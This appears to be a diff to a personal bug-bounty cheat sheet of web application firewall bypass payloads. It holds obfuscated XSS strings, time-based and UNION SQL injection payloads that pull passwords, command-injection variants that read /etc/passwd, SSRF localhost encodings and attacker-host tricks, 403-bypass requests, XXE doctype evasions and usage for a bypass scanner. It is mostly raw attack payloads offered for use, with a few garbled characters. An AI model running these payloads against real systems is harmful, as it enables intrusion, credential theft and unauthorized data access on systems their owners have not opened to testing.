@@ -1,3 +1,12 @@
+https://gowsundar.gitbook.io/book-of-bugbounty-tips/bypasses
+waf-bypass.com
+
+
+
+
+
+XSS
+
 WAF bypass payload and detailed explanation by 
 @s0md3v
 <sVg/onfake="x=y"oNload=;1^(co\u006efirm)``^1//
@@ -28,11 +37,15 @@ Payload: "%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*b
 https://waf.cumulusfire.net/?globalHtml=%20%22%2Bself[%2F*foo*%2F%27alert%27%2F*bar*%2F](self[%2F*foo*%2F%27document%27%2F*bar*%2F][%27domain%27])%2F%2F
 
 
+https://github.com/waf-bypass-maker/waf-community-bypasses/tree/main
 
 
 
 
 
+
+
+SQL
 
 
 
@@ -45,11 +58,266 @@ https://www.vaadata.com/blog/exploiting-an-sql-injection-with-waf-bypass/
 https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/waf-bypass
 https://www.youtube.com/watch?v=zhkCf8tldbk
 
+Akamai WAF Bypass & SQLi 
+
+'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
+
+https://github.com/0xInfection/Awesome-WAF
+
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/waf-bypass
 
 
 
 
 
+
+
+
+
+
+
+
+
+
+
+ssrf
+
+file:$(br)/et$(u)c/pas$(te)swd?/
+file://etc/passwd?/
+
+https://waf-bypass.com/tag/ssrf/
+
+https://nemesida-waf.medium.com/waf-bypass-or-find-out-about-your-waf-flaws-before-an-attacker-does-92c84d361cf6
+# git clone https://github.com/nemesida-waf/waf_bypass.git /opt/waf-bypass/
+# python3 -m pip install -r /opt/waf-bypass/requirements.txt
+# python3 /opt/waf-bypass/main.py --host='example.com'
+
+'--proxy' (--proxy='http://proxy.example.com:3128') - address of the proxy-server to access the target.
+'--header' (--header 'Authorization: Basic YWRtaW46YWRtaW4=' --header 'X-TOKEN:ABCDEF')  - allowsto set additional headers (useful if the target uses Basic Authentication or other access restriction mechanisms.
+'--block-code' ( --block-code='222' or --block-code='403' - block-code='222') - allows to set the WAF response status(es) when blocking a request (useful if the WAF uses response statuses other than 403 or uses different statuses for different block types).
+'--threads' ( --threads=15) - allows to set the number of parallel threads during cĸaning (10 by default).
+'--timeout' ( --timeout=10) - allows to set the time to wait for the response from the server (30 by default).
+'--json-format' --output results in JSON format (by default as tables).
+
+example.com/?cmd=...; /bin/cat /etc/passwd
+example.com/?cmd=...; /bin/cat /et?/pa??wd
+example.com/?cmd=...; /bin/cat /etc\\/pa\\ss\\wd
+example.com/?cmd=...; /b'i'n\/?at /e't'c\/\pa??\wd
+alert('1)
+But the result can also be represented in other ways:
+
+onerror='alert`1`'
+top[/al/.source+/ert/.source](1)
+al\u0065rt(1)
+And the payload
+
+<a href="javascript:alert()">x</a>
+might look like:
+
+<a href=\"j&Tab;avascript&colon;a&Tab;lert()\">x</a>
+Well, in conclusion, for those who ĸthink that SQL injections should contain an escape character, you can consider such a payload:
+
+1 union select password from users
+That is, about the same request will go to the database:
+
+SELECT foo FROM bar WHERE id = 1 UNION SELECT password FROM users;
+Tips and tricks:
+
+You can use a different UTF-8 Text character set in the search field. This would look something like:
+
+SELECT * FROM users WHERE name LIKE 'ａｄｍｉｎ';
+
+
+
+
+
+https://blog.yeswehack.com/yeswerhackers/web-application-firewall-bypass/
+https://vickieli.medium.com/bypassing-ssrf-protection-e111ae70727b
+
+127.0.0.1 translates to 0177.0.0.0x1
+127.0.0.1 translates to 0177.0.0.01
+127.0.0.1 translates to 0x7f.0x0.0x0.0x1
+2130706433 dword
+%6c%6f%63%61%6c%68%6f%73%74
+
+https://infosecwriteups.com/an-exciting-journey-to-find-ssrf-bypass-cloudflare-and-extract-aws-metadata-fdb8be0b5f79
+http://127.0.0.1:80
+
+http://127.0.0.1:443
+
+http://127.0.0.1:22
+
+http://127.1:80
+
+http://0
+
+http://0.0.0.0:80
+
+http://localhost:80
+
+http://[::]:80/
+
+http://[::]:25/ SMTP
+
+http://[::]:3128/ Squid
+
+http://[0000::1]:80/
+
+http://[0:0:0:0:0:ffff:127.0.0.1]/thefile
+
+Even i tried other protocols like : “file:///” , “sftp://” , “gopher://” and so on
+
+
+🏹Use The Whole IP Range For Testing SSRF (198.0.0.1-255)
+
+🏹use Different Encoding Schemes of https://127.O.O.1
+     ▪️ Hex Encoding https://Ox7f.OxO.OxO.Ox1
+     ▪️ Octal Encoding https://0177.O.O.01
+     ▪️ Dword Encoding https://2130706433
+     ▪️ URL Encoding https://%6c%6f%63%61%6c%68%6f%73%74
+     ▪️ Mixed Encoding https://0177.O.O.Ox1
+     Also use 2130706433 or 0177øWWB1
+🏹Obfuscate Strings In URL Encode or Case Transformation (Blocked Words Bypass)
+
+🏹Use Registered Domain Names That Resolves To 127.0.0.1
+
+🏹Embed Credentials : https://attacker@victim.com
+
+🏹use URL Fragments '#' : https://attacker'#'victim.com (Remome the " over the hash)
+
+🏹Use DNS Subdomain Method : https://victim.com.evil.com
+
+🏹Use Directory Method : https://attacker.com/victim.com
+
+🏹Exploit Redirecting The Target
+
+🏹Change The Referrer To Burp Collaborator [Blind Exploit)
+
+🏹Use IPv6 addresses instead of IPv4
+
+🏹Usable Protocols:
+    ▪️gopher : //
+    ▪️file: //
+    ▪️dict://
+🎆Bypass 403🎆 #bugbountytips  
+
+🏹Using "X-Original-URL" header :  
+. . . 
+Request :  
+GET /admin HTTP/1.1 
+Host: http://target.com 
+ 
+ 
+Try this to bypass with 
+. . . 
+GET /anything HTTP/1.1 
+Host: http://target.com 
+ 
+X-Original-URL: /admin
+
+🏹Appending %2e after the first slash 
+. . . 
+Request : 
+http://target.com/admin 
+ => 403 
+ 
+Try to Bypass with 
+. . . 
+http://target.com/%2e/admin 
+ => 200
+
+🏹Try add dot (.) slash (/) and semicolon (;) in the URL 
+. . . 
+http://target.com/admin 
+ => 403 
+ 
+Try to Bypass with  
+. . . 
+http://target.com/secret/ 
+. => 200 
+http://target.com//secret// 
+ => 200 
+http://target.com/./secret/ 
+.. => 200 
+http://target.com/;/secret 
+ => 200 
+http://target.com//;//secret 
+ => 200
+
+🏹Add "..;/" after the directory name 
+. . . 
+http://target.com/admin 
+ => 403 
+ 
+Try this to bypass using ..;/ 
+http://target.com/admin..;/ 
+ => 200
+
+🏹Try to uppercase the alphabet in the url 
+. . . 
+http://target.com/admin 
+ => 403 
+ 
+Try with UPPERCASE : 
+http://target.com/aDmIN 
+ => 200
+
+🏹Via Web Cache Poisoning 
+. . . 
+ 
+GET /anything HTTP/1.1 
+Host: http://victim.com 
+ 
+X­-Original-­URL: /admin
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+XXE
+
+XXE WAF Bypass
+
+3. tampering with doctype/entity names (XXE payloads):
+<!DOCTYPE :. SYSTEM "http://"
+<!DOCTYPE :_-_: SYSTEM "http://"
+<!DOCTYPE {0xdfbf} SYSTEM "http://"
+Remove <?xml version="1.0" encoding="UTF-16"?>
+
+
+You can bypass Akamai WAF's XXE filters by HTML encoding the SYSTEM entity within a payload like this: 
+
+<!DOCTYPE foo [<!ENTITY % a "&#x3c;&#x21; ... omitted ...
+
+neat trick! used this today.
+
+
+https://lab.wallarm.com/xxe-that-can-bypass-waf-protection-98f679452ce0/
+
+
+
+https://waf-bypass.com/tag/xxe/
+
+
+The endpoint on ██████ accepts a POST request with an XML document. A Web-Application Firewall 
+(WAF) successfully blocked all requests that contained any of the keywords <!DOCTYPE, <!ENTITY or <!ELEMENT, 
+that are necessary for XXE attacks to be successful. However, it was possible
+ to bypass the WAF protection, leading to the request being passed to the XML parser.
+
+
+
+https://gowsundar.gitbook.io/book-of-bugbounty-tips/bypasses...........................please check it
 
 
 
